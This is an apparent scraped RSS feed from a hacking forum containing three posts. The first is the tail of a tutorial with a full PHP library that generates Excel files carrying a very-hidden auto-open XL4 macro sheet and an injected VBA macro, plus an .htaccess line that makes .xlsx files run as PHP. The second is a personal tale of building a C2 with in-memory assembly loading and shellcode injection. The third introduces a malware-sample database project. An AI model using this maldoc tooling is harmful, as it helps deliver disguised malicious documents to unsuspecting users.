<span alt="image" data-base62-sha1="ihnQ6JLoAWkeA0NWw7tc5wQaWVW" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The same Excel object reference list also offers the <em>SaveAs</em> function with all meta data fields we can set by hand when using the GUI…:</p>
<pre><code class="lang-auto">/* DISPID=1925 */ function SaveAs(
/* VT_VARIANT [12] [in] */ $Filename, /* VT_VARIANT [12] [in] */ $FileFormat,
/* VT_VARIANT [12] [in] */ $Password, /* VT_VARIANT [12] [in] */ $WriteResPassword,
/* VT_VARIANT [12] [in] */ $ReadOnlyRecommended, /* VT_VARIANT [12] [in] */ $CreateBackup,
/* ? [29] [in] */ $AccessMode, /* VT_VARIANT [12] [in] */ $ConflictResolution,
/* VT_VARIANT [12] [in] */ $AddToMru, /* VT_VARIANT [12] [in] */ $TextCodepage,
/* VT_VARIANT [12] [in] */ $TextVisualLayout, /* VT_VARIANT [12] [in] */ $Local ) { }
</code></pre>
<p>All the supported file extensions by Excel are stored in an enum called <em>XlFileFormat</em>, which is described in detail over @ <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.xlfileformat" rel="nofollow noopener">MSDN</a>.</p>
<p>Anyhow, back to the worksheets object and its <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.worksheets.add" rel="nofollow noopener"><code>Add() method</code></a>:</p>
<pre><code class="lang-auto">/* DISPID=181 */ /* VT_DISPATCH [9] */ function Add(
/* VT_VARIANT [12] [in] */ $Before, /* VT_VARIANT [12] [in] */ $After,
/* VT_VARIANT [12] [in] */ $Count, /* VT_VARIANT [12] [in] */ $Type) { }
</code></pre>
<p><span alt="image" data-base62-sha1="tYcThRBmIa7uT37APiZqUL0Arsk" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This shows that we can create an XL4 sheet if we pass <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.xlsheettype" rel="nofollow noopener"><code>xlExcel4IntlMacroSheet</code></a>(4) as the type.<br>
<code>Excel4IntlMacroSheets.Add() method</code> accomplishes the same task, but does not require any arguments:<br>
<span alt="image" data-base62-sha1="9ZcMEYcV7hBrhHRkuSm4XdMICnV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
When putting that knowledge to use in our PHP script as follows:</p>
<pre><code class="lang-php">define('xlExcel4IntlMacroSheet', 4);
$M1 = $WB-&gt;Worksheets-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
$M2 = $XL-&gt;Excel4IntlMacroSheets-&gt;Add();
</code></pre>
<p>We get validation of our done research in form of:<br>
<span alt="image" data-base62-sha1="lVGpea26Eon5uQ9FcL7uy01K1AQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Two new XL4 macro sheets were successfully created.<br>
Now, due to the new changes Excel refuses to just exit and asks if we’d like to save the file.<br>
We can luckily remove this feature by modifying the boolean value of <code>Application.DisplayAlerts</code> and set it to <em>FALSE</em>:<br>
<span alt="image" data-base62-sha1="8BxWddLqjzv0LyuOLWfGun1XC9O" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$XL-&gt;DisplayAlerts = FALSE;
</code></pre>
<p>Manipulating a worksheet’s content is the next thing for us to do!</p>
<pre><code class="lang-php">com_print_typeinfo($M1);
</code></pre>
<p><span alt="image" data-base62-sha1="xcLSq9f9Nh7lTrMJrNtKYINclZw" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
For example we can tweak the <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.worksheet.visible" rel="nofollow noopener">Visible</a> element in three possible ways:<br>
<code>{xlSheetVisible(-1), xlSheetHidden(0), xlSheetVeryHidden(2)}</code>.</p>
<pre><code class="lang-php">define('xlSheetHidden', 0);
define('xlSheetVeryHidden', 2);
$M1-&gt;Visible = xlSheetHidden;
$M2-&gt;Visible = xlSheetVeryHidden;
</code></pre>
<p><span alt="image" data-base62-sha1="sBKTm84a7qhQfWGXPAqsOfE8rUL" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="lUkGJbGa9pQ6uYOnz3vcKWhBuf" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This results in the two added sheets being hidden.<br>
However, <code>$M1</code> can still be made visible by a normal user.<br>
Some more interesting cell property elements:<br>
<span alt="image" data-base62-sha1="5AMXcRXDn3SXpiKyxbPyPLt2apF" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The value of a cell can hold plain text (e.g.: AAABBBC) or a result (e.g.: 8, the SUM of A1;A2) of a formula.<br>
<span alt="image" data-base62-sha1="mJUIX89AWJuzTcqVTPtJjD114dp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$WS = $WB-&gt;Worksheets[1];
Sleep(60);
printf("Formula: %s&lt;br&gt;Value: %s", $WS-&gt;Cells[1][1]-&gt;Formula, $WS-&gt;Cells[1][1]-&gt;Value);
</code></pre>
<p><span alt="image" data-base62-sha1="vOOoZtHcQh3kYR8nUHrgpPKx4gy" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Ultimately, cells can be accessed as a 2-dimensional array starting with Index = 1.<br>
We can easily simulate that within our PHP script:</p>
<pre><code class="lang-php">$M2-&gt;Cells[3][2]-&gt;Select(); // [Column][Row] Indexing
</code></pre>
<p><span alt="image" data-base62-sha1="o0PhcxsiXwFaNfJ0Dk3z6WXbnTV" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-php">$M2-&gt;Cells(3, 2)-&gt;Select(); // (Row, Column) Indexing
</code></pre>
<p><span alt="image" data-base62-sha1="g3qVYNCW4dwyQJYJ6SmbT3g4Rwx" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Next, the <em>ClearContents</em> procedure role (DISPID=113) clears both the value and an underlying formula of a specified cell.</p>
<h3>Putting it all together</h3>
<p>Putting all that prior theory together we can create a simple PoC with the following snippets below.</p>
<p>Let’s define two payloads <code>0000</code> and <code>0001</code> in form of <code>.vbs</code> scripts as follows:</p>
<pre><code class="lang-auto"># 0000.vbs
=EXEC("calc")
=HALT()
</code></pre>
<pre><code class="lang-auto"># 0001.vbs
Sub Workbook_Open()
	MsgBox "AAAA"
End Sub
</code></pre>
<p>A simple <em>NUExcel.php</em> library that generates documents could look as follows:</p>
<pre><code class="lang-auto">&lt;?php
define('xlExcel8', 56);
define('xlExcel4IntlMacroSheet', 4);

define('xlSheetHidden', 0);
define('xlSheetVeryHidden', 2);
define('xlSheetVisible', -1);

define('CDirectory', getcwd());
define('Payloads', glob("payloads/*.vbs", GLOB_NOSORT));

class DirtyDebug
{
	function DisplayElements($Object)
	{
		$Info = com_print_typeinfo($Object);
		print($Object);
	}
}

class NUExcel extends DirtyDebug
{
	private $XL, $WB;
	public  $Name;
	
	function RName()
	{
		$this-&gt;Name = sprintf("%s/doc%d.xls", CDirectory, rand(1, 14782));
	}
	
	function CreateInstance($Visible = FALSE)
	{
		$this-&gt;XL = new COM('Excel.Application') or die(0);
		$this-&gt;WB = $this-&gt;XL-&gt;Workbooks-&gt;Add();
		
		$this-&gt;XL-&gt;Visible = $Visible;
		$this-&gt;XL-&gt;DisplayAlerts = FALSE;
		
		return TRUE;
	}
	
	function EndInstance($Save = TRUE)
	{
		if ($Save)
		{
			$this-&gt;RName();
			$this-&gt;WB-&gt;SaveAs($this-&gt;Name, xlExcel8);
		}
		
		$this-&gt;WB-&gt;Close();
		$this-&gt;XL-&gt;Quit();
	}
	
	function CreateXL4Sheet()
	{
		$WC = $this-&gt;WB-&gt;Worksheets;
		return $WC-&gt;Add(NULL, NULL, 1, xlExcel4IntlMacroSheet);
	}
	
	function XL4MacroVisibility($MSheet, $Code)
	{
		if($MSheet &amp;&amp; in_array($Code, array(xlSheetHidden, xlSheetVeryHidden, xlSheetVisible)))
		{
			$MSheet-&gt;Visible = $Code;
		}
	}
	
	function GetCell($Sheet, $RNum, $CNum)
	{
		return $Sheet-&gt;Cells($RNum, $CNum);
	}
	
	function GetSetCellData($Cell, $Formule = TRUE, $Data = '')
	{
		$Get = TRUE;
		
		if(strlen($Data))
			$Get = FALSE;
		
		if($Formule)
		{
			if($Get)
				return $Cell-&gt;Formula;
			
			$Cell-&gt;Formula = $Data;
		}
		else
		{
			if($Get)
				return $Cell-&gt;Value;
			
			$Cell-&gt;Value = $Data;
		}
		
		return;
	}
	
	function PayloadName($Index)
	{
		$Name = NULL;
		
		if($Index &gt;= 0 &amp;&amp; $Index &lt; count(Payloads))
		{
			$Name = Payloads[$Index];
		}
		
		return $Name;
	}
	
	function WriteXL4Payload($MSheet, $FNum, $CNum = 1, $RNum = 1)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		if(($Handle = fopen($F, 'r')) != FALSE)
		{	
			do
			{
				$this-&gt;GetSetCellData($this-&gt;GetCell($MSheet, $RNum++, $CNum), TRUE, trim(fgets($Handle)));
			} while(! feof($Handle));
		}	
	}
	
	function ClearXL4Row($MSheet, $CNum = 1, $RNum = 1)
	{
		while(($Cell = $this-&gt;GetCell($MSheet, $this-&gt;$RNum++, $CNum)) &amp;&amp; strlen($this-&gt;GetSetCellData($Cell, FALSE)))
		{
			$Cell-&gt;ClearContents();
		}
		return TRUE;
	}
	
	function RunMacro($MName)
	{
		return $this-&gt;XL-&gt;Run($MName);
	}
	
	function SetCellName($Sheet, $CNum, $RNum, $CName)
	{
		$this-&gt;GetCell($Sheet, $RNum, $CNum)-&gt;Name = $CName;
	}
	
	function GetComponents()
	{
		return $this-&gt;WB-&gt;VBProject-&gt;VBComponents;
	}
	
	function WriteVBAPayload($FNum)
	{
		$F = $this-&gt;PayloadName($FNum);
		if (! $F)
			return;
		
		$CM = $this-&gt;GetComponents();
		$CN = $this-&gt;WB-&gt;CodeName;
			
		if(! empty($CN))
		{
			$Module = $CM[$CN]-&gt;CodeModule;
			$Module-&gt;AddFromFile(realpath($F));
			$Module-&gt;AddFromString(chr(32));
		}
	}
	
	function GetWorksheet($Index)
	{
		$WS = $this-&gt;WB-&gt;Worksheets;
		if($WS-&gt;Count &gt;= $Index)
			return $WS[$Index];
		return NULL;
	}
	
	function InsertPicture($Sheet, $File, $Width = -1, $Height = -1)
	{
		if($Sheet)
			$Sheet-&gt;Shapes-&gt;AddPicture(realpath($File), FALSE, TRUE, 0, 0, $Width, $Height);
	}
}
?&gt;
</code></pre>
<p>Our main routine importing our written library results in a rather short script!</p>
<pre><code class="lang-php">&lt;?php
include 'NUExcel.php';

function Main()
{
	$NEntry = new NUExcel;
	$NEntry-&gt;CreateInstance(TRUE);
	$MS = $NEntry-&gt;CreateXL4Sheet();
	$NEntry-&gt;WriteXL4Payload($MS, 0);
	$NEntry-&gt;SetCellName($MS, 1, 1, "Auto_Ouvrir"); // Auto_Open
	$NEntry-&gt;XL4MacroVisibility($MS, xlSheetVeryHidden);
	$NEntry-&gt;WriteVBAPayload(1);
	$NEntry-&gt;InsertPicture($NEntry-&gt;GetWorksheet(1), "images/image.png");
	$NEntry-&gt;EndInstance();
	
	if($NEntry-&gt;Name)
	{
		printf("File at: %s", $NEntry-&gt;Name);
	}
}

Main();
?&gt;
</code></pre>
<p>The result is the following file:<br>
<span alt="image" data-base62-sha1="5jBUOocpXIbUJ539SoflmBdjCaJ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Obviously, it’s totally legit looking! <img src="https://0x00sec.org/images/emoji/twitter/hugs.png?v=9" title=":hugs:" class="emoji" alt=":hugs:"><br>
<span alt="image" data-base62-sha1="t5DtqSanyWLAI0CV2kIDlyo1wxE" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="xYA97Jnwz1iX471XJ3jKrQ9HTs4" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="u4qcdZiSRMWAWw1LX79ia4VZDOu" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can use the .htaccess file to process a XLSX file as PHP.</p>
<pre><code class="lang-auto">AddHandler application/x-httpd-php .xlsx
</code></pre>
<p><span alt="image" data-base62-sha1="iRTTDQarv4X7niq3ebJOto9pOHo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h3>Final thoughts</h3>
<p><em>There is not much left to be said.<br>
However, an idea will await a passionate individual that’ll make it a reality.<br>
Will it be you?</em></p>
<p><em>VBA Pervertor: A generator of random reversible-sequence of arithmetic operations(<strong>XOR, ADD, SUB, etc</strong>) to encode individual bytes.</em></p>
<h3>Inspirations</h3>
<p><em>“Ma dimmi cosa resta in questa stanza quando la luce si spegne?<br>
Niente.”</em></p>
<p><a href="https://vxug.fakedoma.in/zines/29a/29a8/Articles/29A-8.005.txt" rel="nofollow noopener"><em>Pervert world wide - Z0MBiE/29A</em></a><br>
<a href="https://dl.packetstormsecurity.net/papers/bypass/PolymorphicEvasion.txt" rel="nofollow noopener"><em>On Polymorphic Evasion - Phantasmal Phantasmagoria</em></a><br>
<a href="https://en.wikipedia.org/wiki/Al-Kindi" rel="nofollow noopener"><em>On First Philosophy - Al-Kindi</em></a><br>
<a href="https://en.wikipedia.org/wiki/Amand-Marie-Jacques_de_Chastenet,_Marquis_of_Puys%C3%A9gur" rel="nofollow noopener"><em>Marquis de Puységur</em></a></p>
<h3>Thanks</h3>
<p><em>To my father without whom this article wouldn’t have been possible to write.<br>
To Da, To, <strong>Pr</strong>, Ad, Ka, Mwo, Mt, Pw, Xl, Zi, Mz (y’all know who you are)</em>;</p>
<p><strong>To <a class="mention" href="https://d.clarkee.co.uk/u/ricksanchez">@ricksanchez</a> who made the article a million times better!</strong> <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"><br>
To <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a>, <a class="mention" href="https://d.clarkee.co.uk/u/cry0l1t3">@Cry0l1t3</a> for not hesitating to offer help.<br>
To <a class="mention" href="https://d.clarkee.co.uk/u/jeff">@jeff</a> for the the encouragement.<br>
To <a class="mention" href="https://d.clarkee.co.uk/u/leeky">@Leeky</a>, <a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a>, <a class="mention" href="https://d.clarkee.co.uk/u/dtm">@dtm</a>, <a class="mention" href="https://d.clarkee.co.uk/u/danus">@Danus</a>  and all of 0x00sec for being amazing peoples.</p>
<h3>End</h3>
<p><em><code>Limits are there to be broken, expectations to be surpassed, existence to be proved.</code></em></p>
<p><em>I am the nobody.<br>
I am an addict.<br>
I am madness personified.</em><br>
~ exploit (out)</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/excel-primi-passi/20458">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/excel-primi-passi/20458</link>
          <pubDate>Sun, 12 Apr 2020 17:17:20 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20458</guid>
          <source url="https://d.clarkee.co.uk/t/excel-primi-passi/20458.rss">Excel | Primi passi</source>
        </item>
        <item>
          <title>Personal Tale and the Road to Malware Development, Resources</title>
          <dc:creator><![CDATA[hiMynameIsrandom]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hi long time lurker, I have used this forum quite a lot in the last months so I suppose it makes sense that I post this here, I’m opening this post to share the findings I have made and aslo to share the road so far that I have made down the rabbit hole that is computer science or hacking as some call it.</p>
<p>First I started being serious about this about 4 month ago the classical way I suppose, the skid way, by flashing Kali to a usb key and failing to install it, suceeding and messing around with the scrolling menus to endup in metasploit, sqlmap wifite and all of the rest but that dosen’t really matter it took me quite a while to realize that, anyway at first I was influenced by mrRobot and exepcted to find some secret and with some persistence would end up unlocking the l33t skills that everyone talks about, of course it wasn’t the case it still isn’t, so I watched every videos on youtube I could find about every possible tools under the sun , you know these “hacking” channels that just gather whatver they can find on Github and throw around the words  Pentest, Exploit, MemoryInjection and FUD around them, did some “live” “testing” on what I could call was unauthorised bare metal, it didn’t work and every metasploit module I would use would fail and the payloads would get burned by AV, still I didn’t know why but I had enough self doubt to understand that I was doing something wrong so I searched more and somehow ended up here on this two channels :</p>
<p>youtube/channel/UCVakgfsqxUDo2uTmv9MV_cA/videos<br>
youtube/channel/UC5cYIPFXFc5BuRBGV1P0WnA</p>
<p>(Breaking them links Palo/Alto %sEye Style, sorry for placeholder don’t wana invite the devil in Supertisious even in the 5th domain <img src="https://0x00sec.org/images/emoji/twitter/slightly_smiling_face.png?v=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:">)</p>
<p>Which had a playlist on python for hackers  and malware dev that led me for the next month to try to and make my own “reverse shell” but it ended in a failure, I didn’t understand what was going on I was able to copy paste and replicate what the “teachers” but not why , what’s an import where do you put it what does parsing mean where do I establish a connection do I use metasploit what the fuck is a stager…</p>
<p>Same problems different names… So I did what any decent skid that respect Herself/Himself would do and<br>
I watched every Defcon and BackHat talk I could find and yet still was not further in my objective… Then came the realisation that I didn’t know the culture in which I wanted to be a part of but more than that I didn’t know why I wanted to be a part of it so searched more and eventually I landed I think were we all end up we we want to get serious… Phrack, I mean if you have a good idea Phrack made an article about it… and it was the one about Stack profit smashing etc… and I understood one thing, I wanted to be a “hacker” but I didn’t know a single thing about what a machine was (I still don’t, tbh now I don’t think anybody does in full really… Maybe Mr.Turing but even that I doubt it) and it led me to this channels:<br>
youtube[/channel/UClcE-kVhqyiHCcjYwcpfj9w<br>
youtube/watch?v=zEuvNYe7WG0<br>
youtube/user/WhatsACreel/videos<br>
youtube/watch?v=K0g-twyhmQ4<br>
youtube/watch?v=7VGKeB32f0Y</p>
<p>Most of them are about assembly, It just clicked and I took a paper and a pen and started follwoing slowly taking notes trying to understand what the fuck was going on, eventually I was able to make a hello in x_86 nasm 32bit, learned the registers by heart finally I was out of the nested loop of which I was stuck in, so immidiately I jumped into trying to solve CTF hackTheBox ect… but I failed again more failure, seems to be a pattern here heh?? Trying to develop exploits but the problem is that I still couldn’t code to save my life so even tho I was back in a goto start situation and forced to use metasploit of which I understood nothing about… but more than that I found exploit and everything exploit related very boring then I found my way to BrianKrebbs website, his article about Mirai and the mirai author, I think that was the turning point<br>
MALWARES : rootkit, bots, trojans, RAT, Bootkit, firmkit, UEFI based backdoor, smm backdoor, worm, botnet, webSkimmer, virus, appenders Finnally I had found my way, my discipline, not Exploit, not Rf, not WebApplication testing, not “red teaming”,but Malwares theses little non-sentient Automatas that roams the system and the net I wanted to learn all about them so I tried, and eventually I wanted to make my own but still I didn’t know how to programm  so I decided to learn for real this time, then came the problem of choosing a language, Assembly wasn’t the right choice and then came the classical of “C or C++ is the only choice anything else is useless or won’t be able to do anything blha blah blah” but It quiclky became apparent that making both a server and remote client in C or C++ wasn’t a trivial task for a first program especially for a skid so I kept looking and python  was what most others were suggesting and well this isnt /rprogramming hummor or /rprogrammingCircleJerk and I don"t want to talk badly of something I can only use to make print statements but… It sucks I don’t like it, idk dosen’t compile weird env shit not convenient in my humble opinion… So the final choice came Bewteen C#, Rust or Go, Rust didn’t look too welcoming for a firstimer and C# well, .NET isn’t a trivial thing to understand or use “crossPlatformy” so I guess Go won, the fact that it was Garbage collected helped even tho I didn’t know what it was back then, and I started looking at source code:</p>
<p>github/SaturnsVoid/GoBot2/tree/master/components<br>
github/Ne0nd0g/merlin/blob/1b0ce52d71da62da21cc8f90b97191308e6fe7a9/pkg/agent/exec_windows.go</p>
<p>espescially the works of SaturnsVoid and NeonDog on their respective C2/Malwares but still I knew nothing of concurency, web request, sycalls ect…, so I understood somehow that the awnser was not in defcon Talks or “HACKING FUD TUTORIALS” the awnser was in classical programming learning, and thus I took freeCourses here<br>
]freecodecamp/news/free-online-programming-cs-courses/<br>
[youtube/user/toddmcleod/videos<br>
youtube/channel/UC_BzFbxG2za3bp5NRRRXJSw/videos<br>
chai2010/advanced-go-programming-book/ch2-cgo/ch2-08-class.html<br>
github[./GoBootcamp</p>
<p>and a lot of other Places, also downloaded the Go Programming Language official book and red it religiously, still do to this day, people say golang is a simple language, maybe this is true to print a few things but it becomes quite a challenge to master and understands as soon as you want to do more than that, anyway I had it finally a working Poc of a client that would connect to my server and ask for a command, execute it and send output, I was happy, then I made a cli with an autocomplete prompt straight out of /rUnixporn, discovered the joys of StackOverFlow crtlC crtlV, of discovering new libraries on github and importing them straight up to use their functions,  got better at error handling, made it concurrent so It could accept multpile connections, fixed my prompt,  because arrays kept running out of bounds and empty input wasn’t delt with,  fixed bugs here and there,  took me about a month and half, would wake up in the middle of the night to add features (Mostly powershell stuff and yes Ik it’s outdated) woudl spend 24/7 doing it and I was loving it I would read Unit42 write ups on what other people did and how they fell, TheEye for techinques, MITRE for details, and sooner than I toughts I was in it a so called VxAuthor, MalDev and all of that cool shit that I was aspiring to be for still an unkown reason, but then realty came back and it was time to increment the failure++ counter yet again, because the  learning curve<br>
got really steep when I saw a specific feature on a cobalt Strike demo vid that is called “execute-assembly” and try to implement it, I know now how naive that was but still I tried, what followed was a month of daily failures, because still I knew nothing of the world of MEMORY INJECTIONS… which in a way is a super misleading name, what followed was a discovery of the DLL/PE format, shellcode, Common Language Runtime and a lot of Microsof.docs to understand what the API is, eventually got it working by taking<br>
github[.]/lesnuages/go-execute-assembly/blob/master/assembly/assembly_windows.go</p>
<p>that library and modifying it a slight and could from any url download an assembly and run it from memory, was very unreliable and works 1 times out of 5 but still got very happy when I saw that kwi(SafetyKatz from the GhostPack)  print back to my C2 cli, anyway, I’m still in that stage of understanding Syscalls and how to make them properly, converting C/C++ data type/struct to golang seems to be a trial and error process for me,I am stuck at making my on the fly  DONUT(Thank you the Wover, Alan turing and Stephen few I guess) generated shellcode not making process crash when calling createRemoteThread, I read</p>
<p>phrack[.]/issues/7/3[.]html</p>
<p>and<br>
[.]ddosecrets[.]com/file/Sherwood/HackBack_EN.txt<br>
and found it interesting but still I disagree but not the place here</p>
<p>anyway but now I have a goal, that goal is to make Libray of Malware from userland to Rootkits, to FirmKit and maybe a Hypervisor hook (it’s probably going to take me years, ready when ready) if I can in a multiple of langauge for a multiple of Platforms/OS and a C2 that has all of cobalt STrike functionalities and more and make it open source(Even got A gui libray to make look the same <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> ) , I’m not interested in money or some form of recognition ( this guy said it best https[:]<a href="//www.youtube" rel="nofollow noopener">//www.youtube</a>[.]com/watch?v=gKUleWyfut0 )<br>
this why I didn’t choose a “hacker” nickname or named my Program or C2, it’s just a client and server as far as I am concerned, weird that DataPirates can’t help to sign their work and name themselves for all to fingerprint them, but maybe I am a true Paranoiac after all, but again even the paranoiacs have real enemies…<br>
Anyway I will links all the ressouces that I have used to get here, I think that I am still skid but I don’t mind being a child of the script we alll are I think, I just understand Abstratcion a little bit more than 6 months ago, and after all isn’t that what the machine is all about a land of abstraction, in a way a rabbit hole which only ends at the frontier of our own existence…</p>
<p>ressources : (Only two links allowed heh)<br>
<a href="https://pastebin.com/FwkajgSx" class="onebox" target="_blank" rel="nofollow noopener">https://pastebin.com/FwkajgSx</a></p>
<p>There is more but I got tired of copy pasting after A while, anway on Net if take the right URI you will find what you are looking for.</p>
<p>PS: I won’t reply here and I am leaving this out here for someone to read it may get lost and never looked at but that doesen’t matter anyway I guess this is more me talking to a rubber duck than anything else )</p>
            <p><small>7 posts - 6 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/personal-tale-and-the-road-to-malware-development-resources/20369">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/personal-tale-and-the-road-to-malware-development-resources/20369</link>
          <pubDate>Wed, 08 Apr 2020 22:11:31 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20369</guid>
          <source url="https://d.clarkee.co.uk/t/personal-tale-and-the-road-to-malware-development-resources/20369.rss">Personal Tale and the Road to Malware Development, Resources</source>
        </item>
        <item>
          <title>Fishing for Malware</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>The Malware Lake Project</h1>
<h2>Finding a golden nugget in a lake full of trash</h2>
<p>For a while I was wondering, where am I going to find interesting malware? I have these huge sources of unorganized data: <strong><a href="https://malshare.com/" rel="noopener nofollow ugc">Malshare</a></strong>, <strong><a href="https://www.virustotal.com/gui/" rel="noopener nofollow ugc">VirusTotal</a></strong>, <strong><a href="https://virusshare.com/" rel="noopener nofollow ugc">VirusShare</a></strong>, <strong><a href="https://bazaar.abuse.ch/" rel="noopener nofollow ugc">Malware Bazaar</a></strong> and <strong><a href="https://any.run/" rel="noopener nofollow ugc">AnyRun</a></strong> (<a href="https://github.com/hslatman/awesome-threat-intelligence" rel="noopener nofollow ugc">and so much more!</a>) but they hold so much data that unless you are looking for something very specific it’s highly doubtful that you would find something interesting out of the bat. It felt that all the big boy companies have access to so many resources while I, a single analyst have access to so many databases but no way to organize all the IOCs, Domains, Samples just a huge mess of data. It’s all about perspective and the way I saw the world, looked like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b.png" data-download-href="/uploads/short-url/e7A1LwSqPlt2tdT9wivJO6nMN4v.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b_2_624x351.png" alt="" data-base62-sha1="e7A1LwSqPlt2tdT9wivJO6nMN4v" width="624" height="351" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b_2_624x351.png, /uploads/default/original/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b.png 1.5x, /uploads/default/original/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/62f9d1dc7ad80367e5b0ea26047e2fc8db2bb90b_2_10x10.png"></a></div><p></p>
<p>I wanted that golden nugget! The problem wasn’t the lack of data but the mess of the data. I needed a way to gain access to an endless amount of data but also a way to navigate through it and normalize it. I started looking at tools that might help me solve this problem without setting up 10 Virtual Machines with honeypots and whole instance of some <a href="https://github.com/hslatman/awesome-threat-intelligence" rel="noopener nofollow ugc">threat intelligence platform</a>. And then I was introduced to Splunk. Splunk allowed me to process huge data sets and create beautiful dashboards so I could manage my data sets and search for very specific things.</p>
<h3>Required Tools and Knowledge:</h3>
<ul>
<li>Microsoft Office Excel</li>
<li>Basic knowledge of the Splunk Processing Language</li>
<li>Python IDE with <a href="https://requests.readthedocs.io/en/master/" rel="noopener nofollow ugc">requests</a> and <a href="https://pandas.pydata.org/" rel="noopener nofollow ugc">pandas</a> libraries installed</li>
<li>Some knowledge in Python scripting</li>
</ul>
<p>I’ve created a special Python script that merges Malware Bazaar and Malshare to create a full database, the script is highly flexible and has special objects that would allow anyone to create any database and merge it with other databases to create huge collections of malware. In the context of this post I would be showing you how to use this script. Any developers that wish to improve my script or use it please don’t forget to credit me :3. in addition I’ve tried to make this script documented as possible so anyone could edit it. You can get a copy of my script here:</p>
<p><a href="https://github.com/DanusMinimus/MalwareLake" rel="noopener nofollow ugc">https://github.com/DanusMinimus/MalwareLake</a></p>
<p>I’ve tried to make this script generic and flexible as I possibly could, the database structure difference between Malshare and Malware Bazaar did not make this easy.</p>
<p><strong><span><span>Important details - main.py</span></span></strong></p>
